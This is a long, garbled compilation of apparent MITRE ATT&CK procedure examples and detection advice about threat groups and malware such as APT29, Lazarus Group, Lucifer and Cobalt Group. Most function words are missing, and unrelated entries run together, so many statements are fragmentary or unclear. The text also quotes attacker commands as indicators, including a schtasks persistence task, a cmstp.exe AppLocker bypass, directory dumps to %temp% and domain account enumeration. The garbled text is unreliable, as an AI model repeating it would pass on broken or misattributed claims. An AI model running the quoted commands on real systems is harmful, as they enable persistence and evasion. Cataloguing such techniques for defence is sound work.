targeting. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [Waterbear](https://attack.mitre.org/software/S0579) receive load executables remote C2 servers.(Citation: Trend Micro Waterbear December 2019) [APT29](https://attack.mitre.org/groups/G0016) <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet enumerate Exchange management role assignments Exchange Management Shell.(Citation: Volexity SolarWinds) [DanBot](https://attack.mitre.org/software/S1014) IPv4 records IPv6 AAAA DNS records C2 communications.(Citation: SecureWorks August 2019) [Valak](https://attack.mitre.org/software/S0476) gather user.(Citation: Cybereason Valak 2020) [SOUNDBITE](https://attack.mitre.org/software/S0157) capable gathering information.(Citation: FireEye APT32 2017) [WannaCry](https://attack.mitre.org/software/S0366) encrypts user files demands ransom paid Bitcoin decrypt files.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)(Citation: SecureWorks WannaCry Analysis) [SideCopy](https://attack.mitre.org/groups/G1008) compromised domains host malicious payloads.(Citation: MalwareBytes SideCopy Dec 2021) [Pandora](https://attack.mitre.org/software/S0664) CVE-2017-15303 bypass Windows Driver Signature Enforcement (DSE) protection load driver.(Citation: Trend Micro Iron Tiger April 2021) Monitor newly constructed services/daemons attempt manipulate features artifacts legitimate benign users security tools. [Cachedump](https://attack.mitre.org/software/S0119) extract cached password hashes cache entry information.(Citation: Mandiant APT1) [DCSrv](https://attack.mitre.org/software/S1033) compare current time infected host configuration determine start encryption process.(Citation: Checkpoint MosesStaff Nov 2021) Monitor publicly writeable directories, central locations, commonly staging directories (recycle bin, temp folders, etc.) regularly check compressed encrypted data indicative staging. [Pupy](https://attack.mitre.org/software/S0192) interact victim’s Outlook session folders emails.(Citation: GitHub Pupy) [BabyShark](https://attack.mitre.org/software/S0414) <code>dir</code> search "programfiles" "appdata".(Citation: Unit42 BabyShark Feb 2019)	 [Patchwork](https://attack.mitre.org/groups/G0040) obfuscated script Crypto Obfuscator.(Citation: TrendMicro Patchwork Dec 2017) [APT38](https://attack.mitre.org/groups/G0082) prepended space terminal commands operate leaving traces HISTCONTROL environment.(Citation: CISA AA20-239A BeagleBoyz August 2020) [CSPY Downloader](https://attack.mitre.org/software/S0527) signed revoked certificates.(Citation: Cybereason Kimsuky November 2020) [admin@338](https://attack.mitre.org/groups/G0018) actors commands exploiting machine [LOWBALL](https://attack.mitre.org/software/S0042) malware files directories: <code>dir c:\ >> %temp%\download</code> <code>dir "c:\Documents Settings" >> %temp%\download</code> <code>dir "c:\Program Files\" >> %temp%\download</code> <code>dir d:\ >> %temp%\download</code>(Citation: FireEye admin@338) module [Prikormka](https://attack.mitre.org/software/S0113) collects passwords stored applications installed victim.(Citation: ESET Operation Groundbait) [MoonWind](https://attack.mitre.org/software/S0149) command return directory listing directory.(Citation: Palo Alto MoonWind March 2017) [Cadelspy](https://attack.mitre.org/software/S0454) ability steal data clipboard.(Citation: Symantec Chafer Dec 2015) Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. [HEXANE](https://attack.mitre.org/groups/G1001) `net localgroup` enumerate local groups.(Citation: Kaspersky Lyceum October 2021) [Ke3chang](https://attack.mitre.org/groups/G0004) command-line interaction search files directories.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NICKEL December 2021) [FoggyWeb](https://attack.mitre.org/software/S0661) ability communicate C2 servers GET/POST requests.(Citation: MSTIC FoggyWeb September 2021) Monitoring creation (sub)keys Windows Registry reveal malicious root certificate installation. Installed root certificates located Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and </code>[HKLM HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. subset root certificates consistent Windows systems comparison: (Citation: Tripwire AppUNBlocker)
* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072 Monitor executed commands arguments maliciously modify components victim environment hinder disable defensive mechanisms. [BONDUPDATER](https://attack.mitre.org/software/S0360) <code>-windowstyle hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) window downloads payload.(Citation: FireEye APT34 Dec 2017) Monitor newly constructed processes command-lines execute boot process check unusual unknown applications behavior [StrongPity](https://attack.mitre.org/software/S0491) add directories malware Windows Defender exclusions list prevent detection.(Citation: Talos Promethium June 2020) [APT29](https://attack.mitre.org/groups/G0016) multiple software exploits common client software, Word, Exchange, Adobe Reader, gain code execution.(Citation: F-Secure Dukes)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: MSTIC NOBELIUM 2021) [APT-C-36](https://attack.mitre.org/groups/G0099) disguised scheduled tasks Google.(Citation: QiAnXin APT-C-36 Feb2019) [yty](https://attack.mitre.org/software/S0248) output running processes <code>tasklist</code> command.(Citation: ASERT Donot March 2018) [PS1](https://attack.mitre.org/software/S0613) utilize PowerShell loader.(Citation: BlackBerry CostaRicto November 2020) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) command download execute file victim’s machine.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) [Ryuk](https://attack.mitre.org/software/S0446) constructed legitimate appearing installation folder paths calling <code>GetWindowsDirectoryW</code> inserting byte fourth character path. Windows Vista higher, path <code>C:\Users\Public</code>.(Citation: CrowdStrike Ryuk January 2019) [Silence](https://attack.mitre.org/groups/G0091) RDP lateral movement.(Citation: IB Silence Sept 2018)	 [MegaCortex](https://attack.mitre.org/software/S0576) parse drives directories determine files encrypt.(Citation: IBM MegaCortex)  [Leviathan](https://attack.mitre.org/groups/G0065) created email accounts targeting efforts.(Citation: CISA AA21-200A APT40 July 2021) [PingPull](https://attack.mitre.org/software/S1031) retrieve IP address compromised host.(Citation: Unit 42 PingPull Jun 2022) [Taidoor](https://attack.mitre.org/software/S0011) query Registry compromised hosts <code>RegQueryValueExA</code>.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) (Citation: FireEye APT32 2017) [MoonWind](https://attack.mitre.org/software/S0149) obtains removable drives victim.(Citation: Palo Alto MoonWind March 2017) [Machete](https://attack.mitre.org/software/S0409) base64 encoding.(Citation: Securelist Machete Aug 2014) [AADInternals](https://attack.mitre.org/software/S0677) gather unsecured credentials Azure services, Azure Connect, local machine.(Citation: AADInternals Documentation) [AutoIt backdoor](https://attack.mitre.org/software/S0129) attempts escalate privileges bypassing User Access Control.(Citation: Forcepoint Monsoon) [Earth Lusca](https://attack.mitre.org/groups/G1006) registered domains, intended legitimate target domains, watering hole attacks.(Citation: TrendMicro EarthLusca 2022)  [KGH_SPY](https://attack.mitre.org/software/S0526) ability set Registry key cmd.exe command.(Citation: Cybereason Kimsuky November 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. (Citation: Kaspersky Sofacy) [JHUHUGIT](https://attack.mitre.org/software/S0044) Registry key establish persistence executing JavaScript code rundll32.exe process.(Citation: ESET Sednit 1) [MoleNet](https://attack.mitre.org/software/S0553) achieve persitence infected machine setting Registry key.(Citation: Cybereason Molerats Dec 2020)  Change GPOs define shorter timeouts sessions maximum time single session active. Change GPOs maximum time disconnected session stays active session host server.(Citation: Windows RDP Sessions) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. (Citation: Secureworks BRONZEUNION Feb 2019) [NavRAT](https://attack.mitre.org/software/S0247) email platform, Naver, C2 communications, leveraging SMTP.(Citation: Talos NavRAT 2018) (Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) [Derusbi](https://attack.mitre.org/software/S0021) gathers local host, version GNU Compiler Collection (GCC), CPU, machine, operating system.(Citation: Fidelis Turbo) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. [ADVSTORESHELL](https://attack.mitre.org/software/S0045) stores output command execution .dat file %TEMP% directory.(Citation: ESET Sednit 2) [Leafminer](https://attack.mitre.org/groups/G0077) tools retrieving login password information, including LaZagne.(Citation: Symantec Leafminer July 2018) [Impacket](https://attack.mitre.org/software/S0357) modules GetUserSPNs Service Principal Names (SPNs) user accounts. output formatted compatible cracking tools John Ripper Hashcat.(Citation: Impacket Tools) [Sidewinder](https://attack.mitre.org/groups/G0121) paths executables Registry establish persistence.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020) [APT32](https://attack.mitre.org/groups/G0050) enumerated administrative users commands <code>net localgroup administrators</code>.(Citation: Cybereason Cobalt Kitty 2017) [Pteranodon](https://attack.mitre.org/software/S0147) identifies files matching file extension copies subdirectories created.(Citation: Palo Alto Gamaredon Feb 2017) [APT39](https://attack.mitre.org/groups/G0087) WinRAR 7-Zip compress archive stolen data.(Citation: FireEye APT39 Jan 2019) [Lucifer](https://attack.mitre.org/software/S0532) UPX packed binaries.(Citation: Unit 42 Lucifer June 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) acquired servers host malicious tools.(Citation: ESET Lazarus Jun 2020) [BlackMould](https://attack.mitre.org/software/S0564) files compromised host.(Citation: GALLIUM December 2019) Monitoring module loads, explicitly included import tables, highlight obfuscated code functionality. Dynamic malware analysis expose signs code obfuscation.(Citation: BlackHat API Packers) [MobileOrder](https://attack.mitre.org/software/S0079) exfiltrates data collected victim mobile device.(Citation: Scarlet Mimic Jan 2016) [QakBot](https://attack.mitre.org/software/S0650) ability HTTPS communication C2 servers.(Citation: Trend Micro Qakbot 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021) process API calls behavior indicative [Process Injection](https://attack.mitre.org/techniques/T1055). Monitoring OS API callbacks execution detect behavior requires specialized security tooling. [Proxysvc](https://attack.mitre.org/software/S0238) registers service victim’s machine standalone process.(Citation: McAfee GhostSecret) Ensure proper process, Registry, file permissions prevent adversaries disabling interfering security services. [Kimsuky](https://attack.mitre.org/groups/G0094) searched target company's website.(Citation: KISA Operation Muzabi) (Citation: IB GrimAgent July 2021) [Gelsemium](https://attack.mitre.org/software/S0666) enumerate running processes.(Citation: ESET Gelsemium June 2021) [ZeroT](https://attack.mitre.org/software/S0230) gathers victim's IP address domain information, sends C2 server.(Citation: Proofpoint ZeroT Feb 2017) Monitor newly constructed network device configuration image known-good version discover unauthorized boot, startup configuration, running OS. process accomplished comparison run-time memory, non-trivial require assistance vendor. [GALLIUM](https://attack.mitre.org/groups/G0093) packed payloads types packers, custom.(Citation: Cybereason Soft Cell June 2019) [TA551](https://attack.mitre.org/groups/G0127) spearphishing attachments password protected ZIP files.(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN) [Rocke](https://attack.mitre.org/groups/G0106) conducted scanning exposed TCP port 7001 SSH Redis servers.(Citation: Talos Rocke August 2018)(Citation: Anomali Rocke March 2019) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers download files additional malware components.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Lizar](https://attack.mitre.org/software/S0681) plugin retrieve credentials Internet Explorer Edge `vaultcmd.exe` collect RDP access credentials `CredEnumerateW` function.(Citation: BiZone Lizar 2021) 
[QuasarRAT](https://attack.mitre.org/software/S0262) ability set file attributes "hidden" hide files compromised user's view Windows File Explorer.(Citation: CISA AR18-352A Quasar RAT December 2018) [Lucifer](https://attack.mitre.org/software/S0532) established persistence creating scheduled task <code>schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F</code>.(Citation: Unit 42 Lucifer June 2020) [SYNful Knock](https://attack.mitre.org/software/S0519) instructions special packets change functionality. Code functionality included messages.(Citation: Mandiant - Synful Knock) [Saint Bot](https://attack.mitre.org/software/S1018) `check_registry_keys` environmental checks.(Citation: Malwarebytes Saint Bot April 2021) Monitor executed commands arguments actions gather network information. acquired Windows management tools Windows Management Instrumentation PowerShell. [Saint Bot](https://attack.mitre.org/software/S1018) created scheduled task named "Maintenance" establish persistence.(Citation: Malwarebytes Saint Bot April 2021) [Empire](https://attack.mitre.org/software/S0363) modules executing commands SSH in-memory VNC agent injection.(Citation: Github PowerShell Empire) (Citation: Cycraft Chimera April 2020) [ServHelper](https://attack.mitre.org/software/S0382) created user "Remote Desktop Users" "Administrators" groups.(Citation: Proofpoint TA505 Jan 2019) [ZxShell](https://attack.mitre.org/software/S0412) transfer files compromised host.(Citation: Talos ZxShell Oct 2014) [Pysa](https://attack.mitre.org/software/S0583) Powershell scripts deploy ransomware.(Citation: CERT-FR PYSA April 2020)  [Cobalt Group](https://attack.mitre.org/groups/G0080) command <code>cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt</code> bypass AppLocker launch malicious script.(Citation: Talos Cobalt July 2018)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: Unit 42 Cobalt Gang Oct 2018) creation snapshot common operations cloud environments. Events viewed isolation, chain behavior lead activities creation snapshots restoration snapshots user account.
In AWS, CloudTrail logs capture creation snapshots API calls AWS Backup events. collected CloudTrail, determine request made, IP address request made, user request, made, additional details.(Citation: AWS Cloud Trail Backup API)
In Azure, creation snapshot captured Azure activity logs. Backup restoration events detected Azure Monitor Log Data creating custom alert completed restore jobs.(Citation: Azure - Monitor Logs)
Google's Admin Activity audit logs Cloud Audit logs detect usage the gcloud compute instances create command create VM disk snapshot.(Citation: Cloud Audit Logs) It detect usage GCP API the <code>sourceSnapshot</code> parameter to <code>global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating Starting VM) Monitor file commands files created leading ".” [Crimson](https://attack.mitre.org/software/S0115) module perform keylogging compromised hosts.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) Restrict write access XDG autostart entries select privileged users. [PLEAD](https://attack.mitre.org/software/S0435) ability steal saved passwords Outlook.(Citation: ESET PLEAD Malware July 2018) [FALLCHILL](https://attack.mitre.org/software/S0181) collect operating (OS) version information, processor information, name, installed disks victim.(Citation: US-CERT FALLCHILL Nov 2017) [Koadic](https://attack.mitre.org/software/S0250) WMI execute commands.(Citation: Github Koadic) [APT29](https://attack.mitre.org/groups/G0016) Kerberos ticket attacks lateral movement.(Citation: Mandiant Easy Breach) [Rocke](https://attack.mitre.org/groups/G0106)'s miner, "TermsHost.exe", evaded defenses injecting Windows processes, including Notepad.exe.(Citation: Talos Rocke August 2018)	 Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) [Lazarus Group](https://attack.mitre.org/groups/G0032) PowerShell execute commands malicious code.(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021) [MURKYTOP](https://attack.mitre.org/software/S0233) command-line interface.(Citation: FireEye Periscope March 2018) proxies enforce external network communication policy prevents unauthorized external services. [Mythic](https://attack.mitre.org/software/S0699) supports WebSocket TCP-based C2 profiles.(Citation: Mythc Documentation)	 Monitor newly constructed network connections received untrusted hosts.  [Regin](https://attack.mitre.org/software/S0019) malware platform supports standard protocols, including SMB.(Citation: Kaspersky Regin) documented defenders validate operation ROMMON vendor support. network device suspected compromised, contact vendor assist investigation. [Lazarus Group](https://attack.mitre.org/groups/G0032) malicious links victims email.(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: ClearSky Lazarus Aug 2020)(Citation: ESET Lazarus Jun 2020) (Citation: Symantec Chafer Dec 2015) Monitor API calls detecting token manipulation careful analysis user activity, examination running processes, correlation endpoint network behavior. Analysts monitor Windows APIs <code>CreateProcessWithTokenW</code> correlate activity suspicious behavior reduce false positives normal benign users administrators. [DustySky](https://attack.mitre.org/software/S0062) keylogger.(Citation: DustySky) Monitor unexpected/abnormal file accesses removable media (optical disk drive, USB memory, etc.) connected compromised system.  [OilRig](https://attack.mitre.org/groups/G0049) net.exe script <code>net accounts /domain</code> password policy domain.(Citation: FireEye Targeted Attacks Middle East Banks) user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. [Kazuar](https://attack.mitre.org/software/S0265) obtains list running processes WMI querying <code>ps</code> command.(Citation: Unit 42 Kazuar 2017) [PyDCrypt](https://attack.mitre.org/software/S1032) modified firewall rules incoming SMB, NetBIOS, RPC connections `netsh.exe` remote machines.(Citation: Checkpoint MosesStaff Nov 2021) [Misdat](https://attack.mitre.org/software/S0083) network traffic communicates raw socket.(Citation: Cylance Dust Storm) [FIN10](https://attack.mitre.org/groups/G0051) moved laterally Local Administrator account.(Citation: FireEye FIN10 June 2017) [APT37](https://attack.mitre.org/groups/G0067) credential stealer ZUMKONG harvest usernames passwords stored browsers.(Citation: FireEye APT37 Feb 2018) [OnionDuke](https://attack.mitre.org/software/S0052) capability Denial Service module.(Citation: ESET Dukes October 2019) Ensure critical files abused adversaries restrictive permissions owned appropriately privileged account, access required users inhibit functionality. [Silence](https://attack.mitre.org/groups/G0091) observed videos victims observe bank employees day day activities.(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) [SDBbot](https://attack.mitre.org/software/S0461) rundll32.exe execute DLLs.(Citation: Korean FSI TA505 2020) [Shamoon](https://attack.mitre.org/software/S0140) access shares current privileges, attempts access hard coded, domain-specific credentials gathered earlier intrusion.(Citation: FireEye Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [SombRAT](https://attack.mitre.org/software/S0615) ability download execute additional payloads.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [PlugX](https://attack.mitre.org/software/S0013) module enumerate network shares.(Citation: CIRCL PlugX March 2013) [SilverTerrier](https://attack.mitre.org/groups/G0083) SMTP C2 communications.(Citation: Unit42 SilverTerrier 2018) [Taidoor](https://attack.mitre.org/software/S0011) perform DLL loading.(Citation: TrendMicro Taidoor)(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Turla](https://attack.mitre.org/groups/G0010) infected victims watering holes.(Citation: ESET ComRAT 2020)(Citation: Secureworks IRON HUNTER Profile) [Agent Tesla](https://attack.mitre.org/software/S0331) C2 communications.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla June 2017) 2016, [APT28](https://attack.mitre.org/groups/G0007) conducted distributed denial service (DDoS) attack Anti-Doping Agency.(Citation: District Court Indictment GRU Oct 2018) [WellMess](https://attack.mitre.org/software/S0514) identify compromised host.(Citation: PWC WellMess July 2020)(Citation: CISA WellMess July 2020) (Citation: Kaspersky Sofacy)(Citation: Securelist Sofacy Feb 2018) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [APT28](https://attack.mitre.org/groups/G0007) intentionally deleted files cover tracks, including program CCleaner.(Citation: DOJ GRU Indictment Jul 2018) [CookieMiner](https://attack.mitre.org/software/S0492) looked files user's directory "wallet" <code>find</code>.(Citation: Unit42 CookieMiner Jan 2019) Monitor interactions network shares, reads file transfers, Server Message Block (SMB). [SharpStage](https://attack.mitre.org/software/S0546) execute arbitrary commands PowerShell.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) Ensure Driver Signature Enforcement enabled restrict unsigned drivers installed.  [ADVSTORESHELL](https://attack.mitre.org/software/S0045) collects, compresses, encrypts, exfiltrates data C2 server minutes.(Citation: ESET Sednit 2) [Ixeshe](https://attack.mitre.org/software/S0015) collects victim's initial infection.(Citation: Trend Micro IXESHE 2012) [Patchwork](https://attack.mitre.org/groups/G0040) open-source tools [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Volexity Patchwork June 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) inject variety payloads processes dynamically chosen adversary.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020)(Citation: DFIR Conti Bazar Nov 2021) variant [CloudDuke](https://attack.mitre.org/software/S0054) OneDrive account exchange commands stolen data operators.(Citation: F-Secure Dukes) Depending method pad files, file-based signature capable detecting padding scanning on-access based tool. executed, process padded files exhibit behavior characteristics conduct intrusion network Discovery Lateral Movement, event indicators source file. [BitPaymer](https://attack.mitre.org/software/S0570) set key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> persistence.(Citation: Crowdstrike Indrik November 2018) [S-Type](https://attack.mitre.org/software/S0085) ability execute commands compromised host.(Citation: Cylance Dust Storm) [Crimson](https://attack.mitre.org/software/S0115) request download final payload.(Citation: Proofpoint Operation Transparent Tribe March 2016) [FIN7](https://attack.mitre.org/groups/G0046) encrypted virtual disk volumes ESXi servers version Darkside ransomware.(Citation: CrowdStrike Carbon Spider August 2021) [Remcos](https://attack.mitre.org/software/S0332) infected hosts SOCKS5 proxies tunneling proxying.(Citation: Riskiq Remcos Jan 2018) [Gamaredon Group](https://attack.mitre.org/groups/G0047) removed security settings VBA macro execution changing registry values <code>HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings</code> <code>HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM</code>.(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021) [CHOPSTICK](https://attack.mitre.org/software/S0023)  includes runtime checks identify analysis environment prevent execution it.(Citation: FireEye APT28) Install software write-protected locations. difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape) (Citation: Cisco 72)(Citation: Novetta-Axiom) [Whitefly](https://attack.mitre.org/groups/G0107) [Mimikatz](https://attack.mitre.org/software/S0002) credentials.(Citation: Symantec Whitefly March 2019) [Kevin](https://attack.mitre.org/software/S1020) custom protocol tunneled DNS HTTP.(Citation: Kaspersky Lyceum October 2021) (Citation: Unit 42 PingPull Jun 2022) [Hydraq](https://attack.mitre.org/software/S0203) basic obfuscation form spaghetti code.(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Trojan.Hydraq Jan 2010) Monitor executed commands arguments abuse Office templates persistence compromised system. documented method defenders identify behaviors reduce encryption key space. Detection efforts focused closely adversary behaviors, Modify Image Network Device CLI. detection methods require vendor support aid investigation. Update software regularly employing patch management internal enterprise endpoints servers. Monitor presence CHM files, typically environment. [RDAT](https://attack.mitre.org/software/S0495) communicate C2 subdomains utilize base64 character substitutions.(Citation: Unit42 RDAT July 2020)	 [PingPull](https://attack.mitre.org/software/S1031) encode C2 traffic Base64.(Citation: Unit 42 PingPull Jun 2022) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware.  [PowerDuke](https://attack.mitre.org/software/S0139) commands current user's SID.(Citation: Volexity PowerDuke November 2016) [APT32](https://attack.mitre.org/groups/G0050) PowerShell-based tools, PowerShell one-liners, shellcode loaders execution.(Citation: FireEye APT32 2017)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) Monitor unexpected deletion  client software binaries establish persistent access systems. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia saves gathered victim file saved %TEMP% directory, compressed, encrypted, uploaded C2 server.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders) [Wiarp](https://attack.mitre.org/software/S0206) creates backdoor remote attackers command interface.(Citation: Symantec Wiarp 2012) [RTM](https://attack.mitre.org/groups/G0048) spearphishing attachments distribute malware.(Citation: IB RTM August 2019) [zwShell](https://attack.mitre.org/software/S0350) victim PC OS version.(Citation: McAfee Night Dragon) Monitor executed commands arguments modify Policy Objects (GPOs) subvert intended discretionary access controls domain, intention escalating privileges domain. [Empire](https://attack.mitre.org/software/S0363) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-Kerberoast</code> request service tickets return crackable ticket hashes.(Citation: Github PowerShell Empire) [Kimsuky](https://attack.mitre.org/groups/G0094) executed Windows commands `cmd` running batch scripts.(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) Monitor network traffic requests downloads container images, anomalous malicious. [Sowbug](https://attack.mitre.org/groups/G0054) extracted Word documents file server victim network.(Citation: Symantec Sowbug Nov 2017) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors publicly-available JSP code deploy webshell compromised server.(Citation: Cybereason OperationCuckooBees 2022)    (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018) [CrossRAT](https://attack.mitre.org/software/S0235) list files system. Detection Network DoS achieved traffic volume sufficient impact availability service, response time typically requires aggressive monitoring responsiveness services upstream network service provider. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) [OilRig](https://attack.mitre.org/groups/G0049) <code>net user</code>, <code>net user /domain</code>, <code>net “domain admins” /domain</code>, <code>net “Exchange Trusted Subsystem” /domain</code> account listings victim.(Citation: Palo Alto OilRig 2016) [Kimsuky](https://attack.mitre.org/groups/G0094) registered domains spoof targeted organizations trusted parties.(Citation: ThreatConnect Kimsuky September 2020)(Citation: Zdnet Kimsuky September 2020)(Citation: CISA AA20-301A Kimsuky)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi)  [BADCALL](https://attack.mitre.org/software/S0245) functions proxy server victim C2 server.(Citation: US-CERT BADCALL) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware download additional files C2 servers.(Citation: Unit 42 Gorgon Aug 2018) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) embedded [Stripped Payloads](https://attack.mitre.org/techniques/T1027/008) run-only [Stripped Payloads](https://attack.mitre.org/techniques/T1027/008).(Citation: SentinelLabs reversing run-only applescripts 2021) [FunnyDream](https://attack.mitre.org/software/S1044) ability discover processes, including `Bka.exe` `BkavUtil.exe`.(Citation: Bitdefender FunnyDream Campaign November 2020) [Bumblebee](https://attack.mitre.org/software/S1039) create Visual Basic script enable persistence.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) (Citation: FireEye APT19) [PLAINTEE](https://attack.mitre.org/software/S0254) <code>ipconfig /all</code> command gather victim’s IP address.(Citation: Rancor Unit42 June 2018) [PoshC2](https://attack.mitre.org/software/S0378) modules keystroke logging capturing credentials spoofed Outlook authentication messages.(Citation: GitHub PoshC2) Monitor generated artifacts host system, including logs captured files quarantined emails. 

On Windows 10, mail application data stored <code>C:\Users\Username\AppData\Local\Comms\Unistore\data</code>. Linux, mail data stored <code>/var/spool/mail</code> <code>/var/mail</code>. macOS, mail data stored <code>~/Library/Mail</code>. Audit applications permissions ensure access data resources limited based necessity principle privilege. Monitor user accounts unexpected modification properties, passwords status (enabled/disabled). Windows event logs designate activity adversary's attempt remove access account:
Event 4723 - attempt change account's password
Event 4724 - attempt reset account's password
Event 4725 - user account disabled

Alerting Event IDs generate degree false positives, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. [Action RAT](https://attack.mitre.org/software/S1028) ability collect MAC address infected host.(Citation: MalwareBytes SideCopy Dec 2021) [Fox Kitten](https://attack.mitre.org/groups/G0117) base64 encoded scripts payloads avoid detection.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) hosted custom open-source tools compromised [Lazarus Group](https://attack.mitre.org/groups/G0032)-controlled servers.(Citation: ESET Lazarus Jun 2020) [Revenge RAT](https://attack.mitre.org/software/S0379) plugin perform RDP access.(Citation: Cylance Shaheen Nov 2018)
 [Higaisa](https://attack.mitre.org/groups/G0126) dropped <code>officeupdate.exe</code> scheduled tasks.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) [ServHelper](https://attack.mitre.org/software/S0382) attempt enumerate Windows version architecture.(Citation: Proofpoint TA505 Jan 2019) [CreepyDrive](https://attack.mitre.org/software/S1023) legitimate OAuth refresh tokens authenticate OneDrive.(Citation: POLONIUM June 2022) Monitor executed commands arguments establish persistence elevate privileges executing malicious content triggered Image File Execution Options (IFEO) debuggers. <code>net start</code> <code>net stop</code> commands [Net](https://attack.mitre.org/software/S0039) execute Windows services.(Citation: Savill 1999) Limit remote user permissions remote access necessary. [Gamaredon Group](https://attack.mitre.org/groups/G0047) tested connectivity compromised machine C2 server  [Ping](https://attack.mitre.org/software/S0097) commands `CSIDL_SYSTEM\cmd.exe /c ping -n 1`.(Citation: Symantec Shuckworm January 2022) [Earth Lusca](https://attack.mitre.org/groups/G1006) collected user accounts <code>whoami</code> 